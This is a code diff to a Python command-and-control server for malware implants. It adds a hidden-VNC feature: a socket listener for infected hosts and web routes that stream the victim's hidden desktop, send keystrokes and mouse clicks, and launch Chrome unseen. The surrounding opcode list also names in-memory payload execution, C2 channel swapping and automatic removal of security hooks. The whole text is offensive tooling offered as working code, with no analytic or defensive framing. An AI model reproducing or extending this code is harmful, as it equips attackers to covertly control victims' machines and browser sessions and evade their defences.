@@ -20,6 +20,7 @@ HTTP_C2_PORT = 1234
 SOCKS_PORT = 6968
 TEAMSERV_PORT = 6942
 VNC_PORT = 1235
+HVNC_PORT = 1236
 
 opcodes = """
     PRINT, //1//print [text]
@@ -39,7 +40,8 @@ opcodes = """
     BOF_EXECUTE, //1//bof_execute file([bof file])
     SWAP_C2, //?//swap_c2 [c2 method] ... [poll interval]
     UNHOOK, //0//auto remove hooks
-    VNC //2//vnc [ip] [port]
+    VNC, //2//vnc [ip] [port]
+    HVNC, //2//hvnc [ip] [port]
 """
 c2s = """
     SOCKS,
@@ -52,6 +54,71 @@ def gettime():
 def iphash(ip):
     return hex(binascii.crc32(socket.inet_aton(ip)))[-4:].upper()
 vncs = {}
+hvncs = {}
+@app2.route("/hvnc/firstimage.png" , methods=['GET'])
+def firstimghvnc():
+    global hvncs
+    try:
+        vid = request.args["id"]
+        hvncs[vid].sendall(b"\x67"*9)
+        while hvncs[vid].recv(4, socket.MSG_WAITALL) != b"DATA":
+            pass
+        sz = int.from_bytes(hvncs[vid].recv(4, socket.MSG_WAITALL), "little")
+        hvncs[vid].recv(8, socket.MSG_WAITALL)
+        data = hvncs[vid].recv(sz, socket.MSG_WAITALL)
+        response = make_response(data)
+        response.headers.set('Content-Type', 'image/png')    
+        return response
+    except:
+        if vid in hvncs:
+            hvncs[vid].close()
+            del hvncs[vid]
+        return ""
+@app2.route("/hvnc/image.png" , methods=['GET'])
+def getimghvnc():
+    global hvncs
+    try:
+        vid = request.args["id"]
+        while hvncs[vid].recv(4, socket.MSG_WAITALL) != b"DATA":
+            pass
+        sz = int.from_bytes(hvncs[vid].recv(4, socket.MSG_WAITALL), "little")
+        x = int.from_bytes(hvncs[vid].recv(4, socket.MSG_WAITALL), "little")
+        y = int.from_bytes(hvncs[vid].recv(4, socket.MSG_WAITALL), "little")
+        data = hvncs[vid].recv(sz, socket.MSG_WAITALL)
+        response = make_response(data)
+        response.headers.set('Content-Type', 'image/png')
+        response.headers.set('X', str(x))
+        response.headers.set('Y', str(y))
+        return response
+    except:
+        if vid in hvncs:
+            hvncs[vid].close()
+            del hvncs[vid]
+        return ""
+@app2.route("/hvnc/keydown/<key>" , methods=['GET'])
+def kdh(key):
+    global hvncs
+    vid = request.args["id"]
+    hvncs[vid].sendall(b"\x69"+struct.pack("<I", int(key))+b"\x00\x00\x00\x00")
+    return "a"
+@app2.route("/hvnc/mouse/<x>/<y>" , methods=['GET'])
+def clickh(x,y):
+    global hvncs
+    vid = request.args["id"]
+    hvncs[vid].sendall(b"\x71"+struct.pack("<I", int(x))+struct.pack("<I", int(y)))
+    return "a"
+@app2.route("/hvnc/mouseup/<x>/<y>" , methods=['GET'])
+def clickup(x,y):
+    global hvncs
+    vid = request.args["id"]
+    hvncs[vid].sendall(b"\x72"+struct.pack("<I", int(x))+struct.pack("<I", int(y)))
+    return "a"
+@app2.route("/hvnc/chrome" , methods=['GET'])
+def chromeh():
+    global hvncs
+    vid = request.args["id"]
+    hvncs[vid].sendall(b"\x73"+b"\x00"*8)
+    return "a"
 @app2.route("/firstimage.png" , methods=['GET'])
 def firstimg():
     global vncs
@@ -95,6 +162,12 @@ def openvnc(port):
     r=f.read().replace("{ID}", port)
     f.close()
     return r
+@app2.route("/hvnc/<port>" , methods=['GET'])
+def openhvnc(port):
+    f=open("server/ui/hvnc.html", "r")
+    r=f.read().replace("{ID}", port)
+    f.close()
+    return r
 @app2.route("/closevnc" , methods=['GET'])
 def closevnc():
     vid = request.args["id"]
@@ -103,7 +176,15 @@ def closevnc():
         del vncs[vid]
         return "Connection closed successfully!"
     return "Connection not closed"
-
+@app2.route("/closehvnc" , methods=['GET'])
+def closehvnc():
+    global hvncs
+    vid = request.args["id"]
+    if vid in hvncs:
+        hvncs[vid].close()
+        del hvncs[vid]
+        return "Connection closed successfully!"
+    return "Connection not closed"
 def vncth():
     global vncs, VNC_PORT
     HOST = "0.0.0.0"
@@ -114,6 +195,16 @@ def vncth():
     while True:
         conn, addr = s.accept()
         vncs[str(addr[1])] = conn
+def hvncth():
+    global hvncs, HVNC_PORT
+    HOST = "0.0.0.0"
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+    s.bind((HOST, HVNC_PORT))
+    s.listen()
+    while True:
+        conn, addr = s.accept()
+        hvncs[str(addr[1])] = conn
 
 @app.route("/document/<uid>" , methods=['GET'])
 def command(uid):
@@ -213,12 +304,14 @@ def allo():
     return allout.strip()+"\n"
 @app2.route("/clients" , methods=['GET'])
 def alive():
-    global living, vncs
+    global living, vncs, hvncs
     a = []
     for x in living:
         a.append(x+" ("+living[x][0]+")")
     for x in vncs:
         a.append('<a target="_blank" href="/vnc/'+x+'">VNC '+x+'</a>')
+    for x in hvncs:
+        a.append('<a target="_blank" href="/hvnc/'+x+'">HVNC '+x+'</a>')
     return json.dumps(a)
 @app2.route("/" , methods=['GET'])
 def index():
@@ -261,4 +354,5 @@ threading.Thread(target=livers).start()
 killthread.Thread(target=sockserv).start()
 killthread.Thread(target=httpserv).start()
 killthread.Thread(target=vncth).start()
+killthread.Thread(target=hvncth).start()
 serve(app2, host="127.0.0.1", port=TEAMSERV_PORT)
